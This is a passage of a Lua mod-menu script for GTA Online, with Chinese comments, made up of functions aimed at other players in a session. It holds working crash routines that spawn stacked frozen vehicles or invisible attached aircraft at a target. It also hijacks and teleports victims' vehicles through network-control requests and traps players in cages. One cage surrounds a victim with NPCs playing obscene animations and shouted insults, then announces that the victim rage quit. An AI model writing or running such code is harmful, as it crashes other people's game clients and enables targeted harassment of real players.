            ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
            SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
            SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
            SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
            SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
            SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
            SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)
    
            ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            for i = 0, 100 do 
                TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                util.yield(10)
            end
            util.yield(2000)
            entities.delete_by_handle(SpawnedTowtruck)
            entities.delete_by_handle(SpawnedDune1)
            entities.delete_by_handle(SpawnedDune2)
            entities.delete_by_handle(SpawnedBarracks31)
            entities.delete_by_handle(SpawnedBarracks32)
            entities.delete_by_handle(SpawnedBarracks1)
            entities.delete_by_handle(SpawnedBarracks2)
end
--鬼崩
function guibeng(PlayerID)
            menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
            local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
            local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
            local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
            for i = 0, 100 do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
                util.yield(10 * math.random())
                ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
                util.yield(10 * math.random())
            end
            menu.trigger_commands("anticrashcam off")
        end
--将墙放在玩家面前
function fastNet(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 30 do
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                util.yield(10)
            else
                goto continue
            end    
        end
    end
    ::continue::
    if SE_Notifications then
        notification("有控制权.")
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    util.yield(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    util.yield(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    util.yield(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    util.yield(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    util.yield(10)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(entity, false)
    util.yield(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    util.yield(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        util.yield()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        util.yield()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end
function qfmq(pid)
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
        local pheading = ENTITY.GET_ENTITY_HEADING(ped)
        local hash = 309416120
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
        local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
        ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
        fastNet(a1, pid)
        local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
        ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
        fastNet(b1, pid)
        util.yield(500)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(b1)
end
--将玩家传送到花园银行
function sqhy(pid)
         local ped = PLAYER.GET_PLAYER_PED(pid)
        local pc = ENTITY.GET_ENTITY_COORDS(ped)
        local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED(), pc.x, pc.y, pc.z + 10, false, false, false)
            util.yield(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                util.yield(100)
            end
            if SE_Notifications then
                notification("传送 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 上去花园银行塔!")
            end
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--将玩家传送到高空
function sqgk(pid)
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local pc = ENTITY.GET_ENTITY_COORDS(ped)
        local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pc.x, pc.y, pc.z + 10, false, false, false)
            util.yield(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -75, -818, 2400, false, false, false)
                util.yield(100)
            end
            if SE_Notifications then
                notification("传送 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 上去高空!")
            end
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--劫持车辆
function hijacking_vehicles(pid)
menu.trigger_commands("vehkick "..players.get_name(pid))
    control_vehicle(pid, function(vehicle)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, -2.0, 0.0, 0.1)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, 0)
        local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true)
        TASK.TASK_ENTER_VEHICLE(ped, vehicle, -1, -1, 1.0, 24)
        if hijackLevel == 1 then
            util.yield(20)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        end
        for _ = 1, 20 do
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
            util.yield(50)
        end
    end)
end
--随机升级
function random_upgrade(pid)
        control_vehicle(pid, function(vehicle)
            VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
            for x = 0, 49 do
                local max = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, x)
                VEHICLE.SET_VEHICLE_MOD(vehicle, x, math.random(-1, max))
            end
            VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(-1,5))
            for x = 17, 22 do
                VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, x, math.random() > 0.5)
            end
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
        end)
end
--让他以为自己能走
function ywnz(pid)
         local ped = PLAYER.GET_PLAYER_PED(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
            local oldcoords = ENTITY.GET_ENTITY_COORDS(ped)
            util.yield(500)
            local nowcoords = ENTITY.GET_ENTITY_COORDS(ped)
            for a = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield()
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
            util.yield(200)
            for b = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield()
            end
            ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
            for c = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield()
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
            for d = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield()
            end
            ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
            util.yield(500)
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内")
        end
end
--新世纪全自动化套笼
cages = {} 
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	

	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end
--ped笼
function Delcar(vic)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(tarcar)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        entities.delete_by_handle(tarcar)
    end
end

function Pedspawn(tar1)

    Ped_mdl = Ped_mdl or 'ig_lestercrest'
    Pedhash = util.joaat(Ped_mdl)
    Streament(Pedhash)
    local pedS = entities.create_ped(1, Pedhash, tar1, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pedS, true)
    ENTITY.FREEZE_ENTITY_POSITION(pedS, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pedS, true)
    PED.SET_PED_CAN_LOSE_PROPS_ON_DAMAGE(pedS, false)
    if Pedhash == util.joaat('ig_lestercrest') then
        PED.SET_PED_PROP_INDEX(pedS, 1)
    end

    return pedS
end

function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    util.yield()
    end
end

function SetPedCoor(pedS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(pedS, tarx, tary, tarz, false, true, true, false)
end

function Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    util.create_tick_handler (function ()
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p2, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p3, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p4, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p5, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p6, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p7, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p8, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
--AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'HS3LE_ANAB', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        util.yield(100)
        end)
end

function Streamanim(anim) --Streaming Model
    STREAMING.REQUEST_ANIM_DICT(anim)
    while STREAMING.HAS_ANIM_DICT_LOADED(anim) ==false do
        STREAMING.REQUEST_ANIM_DICT(anim)
        util.yield()
    end
end

function Runanim(ent, animdict, anim)
    TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
    while ENTITY.IS_ENTITY_PLAYING_ANIM(ent, animdict, anim, 3) ==false do
        TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
        util.yield()
    end
end

function PFP(pedm, playerm)--Ped Facing Player adapted from PhoenixScript
    local ppos = ENTITY.GET_ENTITY_COORDS(playerm)
    local pmpos = ENTITY.GET_ENTITY_COORDS(pedm)
    local hx = ppos.x - pmpos.x
    local hy = ppos.y - pmpos.y
    local head = MISC.GET_HEADING_FROM_VECTOR_2D(hx, hy)
    return ENTITY.SET_ENTITY_HEADING(pedm, head)
end

function Stopsound()
    for i = 0, 99 do
        AUDIO.STOP_SOUND(i)
    end
end

function IPM(targets, tar1, pname, cage_table, pid)
    local tar2 = ENTITY.GET_ENTITY_COORDS(targets)
    Disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, tar1.x, tar1.y, tar1.z)
    if Disbet <= 0.5  then
        notification(pname.."被困住")
    util.yield(800)

    elseif Disbet >= 0.5  then
    util.yield(800)
    notification(pname.."挣脱了")
    DelEnt(cage_table[pid])
    cage_table[pid] = false
    Stopsound()
    end
end

function pedcageg(pid)
local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
local pname = PLAYER.GET_PLAYER_NAME(pid)
if not cage_table[pid] then
    local peds = {}

    Delcar(targets)
    

local p1 = Pedspawn(tar1)
local p2 = Pedspawn(tar1)
local p3 = Pedspawn(tar1)
local p4 = Pedspawn(tar1)
local p5 = Pedspawn(tar1)
local p6 = Pedspawn(tar1)
local p7 = Pedspawn(tar1)
local p8 = Pedspawn(tar1)

SetPedCoor(p1, tar1.x, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(p2, tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(p3, tar1.x - 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(p4, tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(p5, tar1.x, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(p6, tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(p7, tar1.x + 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(p8, tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

---------Audio--------------
if Pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
elseif Pedhash == util.joaat('player_two') then
    Trevortime(p1, p2, p3, p4, p5, p6, p7, p8)
elseif Pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
if AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'GENERIC_FUCK_YOU') ==true 
then Fuckyou(peds)

elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'Provoke_Trespass')
then Provoke(peds)

elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'Generic_Insult_High')
then Insulthigh(peds)

elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'GENERIC_WAR_CRY')
then Warcry(peds) 
else
end
end

      -----------Anim-------------------------
    Streamanim('rcmpaparazzo_2')
    Streamanim('mp_player_int_upperfinger')
    Streamanim('switch@trevor@jerking_off')
    local ped_anim = {p2, p3, p4, p5, p6, p7, p8}
    for _, Pedanim in ipairs(ped_anim) do
        if Pedhash == util.joaat('player_two') then
            Runanim(Pedanim, 'switch@trevor@jerking_off','trev_jerking_off_loop')
        else Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
        end

        Runanim(p1, 'rcmpaparazzo_2', 'shag_loop_a')
end
    local ped_tab = {p1, p2, p3, p4, p5, p6, p7, p8}
    for _, spawned_ped in ipairs(ped_tab) do
        table.insert(peds,  spawned_ped)
    end


for _, Pedm in ipairs(peds) do
    PFP(Pedm, targets) --- ped facing player
end


cage_table[pid] = peds
end --if not cage_table[pid] end

while cage_table[pid] do
IPM(targets, tar1, pname, cage_table, pid)


end


if not players.exists(pid) then
    
    notification('You made them rage quit')
    util.stop_thread()

    cage_table[pid] = nil
end
end
--解除Ped笼
function DelEnt(ped_tab)
    for _, Pedm in ipairs(ped_tab) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Pedm)
        entities.delete_by_handle(Pedm)
    end
end
function freecageg(pid)
    if cage_table[pid] then
        DelEnt(cage_table[pid])

        cage_table[pid] = false 
        else notification('No Ped Cage Found')
    end
end
--普通笼子
function ptlz(pid)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("未能将玩家踢出载具")
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
end
--七度空间
function qdkj(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--小车车
function cclz(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function  sdkl1(pid)

	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
